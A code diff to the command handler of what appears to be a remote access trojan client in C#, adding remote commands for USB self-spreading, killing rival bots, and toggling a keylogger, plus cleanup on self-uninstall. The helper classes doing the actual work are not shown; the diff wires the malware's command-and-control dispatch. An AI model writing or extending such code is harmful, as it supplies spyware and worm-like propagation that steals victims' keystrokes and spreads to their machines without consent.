@@ -1,4 +1,5 @@
-﻿using Client.MessagePack;
+﻿using Client.Helper;
+using Client.MessagePack;
 using Client.Sockets;
 using System;
 using System.Diagnostics;
@@ -78,6 +79,13 @@ namespace Client.Handle_Packet
                     case "uninstall":
                         {
                             Uninstall();
+                        }
+                        break;
+
+                    case "usbSpread":
+                        {
+                            LimeUSB limeUSB = new LimeUSB();
+                            limeUSB.Run();
                         }
                         break;
 
@@ -173,6 +181,32 @@ namespace Client.Handle_Packet
 
                         }
                         break;
+
+                    case "botKiller":
+                        {
+                            BotKiller botKiller = new BotKiller();
+                            botKiller.RunBotKiller();
+                        }
+                        break;
+
+                    case "keyLogger":
+                        {
+                            FileManager fileManager = new FileManager();
+                            string isON = unpack_msgpack.ForcePathObject("isON").AsString;
+                            if (isON == "true")
+                            {
+                                new Thread(() =>
+                                {
+                                    LimeLogger.isON = true;
+                                    LimeLogger.Run();
+                                }).Start();
+                            }
+                            else
+                            {
+                                LimeLogger.isON = false;
+                            }
+                        }
+                        break;
                 }
             }
             catch { }
@@ -202,6 +236,7 @@ namespace Client.Handle_Packet
             catch { }
             finally
             {
+                Methods.CloseMutex();
                 Process.Start(Del);
                 Environment.Exit(0);
             }
